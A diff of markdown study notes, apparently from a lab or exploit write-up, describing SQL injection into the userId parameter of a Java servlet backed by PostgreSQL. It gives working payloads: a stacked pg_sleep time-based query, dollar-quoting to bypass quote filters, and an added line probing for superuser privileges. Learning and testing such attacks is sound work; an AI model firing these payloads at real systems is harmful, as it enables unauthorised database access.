@@ -12,4 +12,4 @@ Java web applications use a deployment descriptor file named **`web.xml`** to de
 - `/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;` by injecting a special character (`;`) into the vulnerable parameter, we can check the logs for any syntax errors to verify if the injection was successful using the following command: `Get-Content postgresql_13.log -tail 100 | Select-String -pattern "syntax error"`
 - PGSQL supports stacked queries `/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;select+pg_sleep(10);`
 - if the app filters the quotes `'`, PostgreSQL supports `$$` (dollar-quoting) as a replacement for single quotes (`'`) to simplify writing strings that contain literal quotes.
-- 
+- The attacker tests a SQL injection vulnerability to confirm DBA privileges by using a payload that checks if `current_setting('is_superuser')` returns `"on"`. If true, it triggers a 10-second delay via `pg_sleep(10)`, confirming administrative access. `/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+`
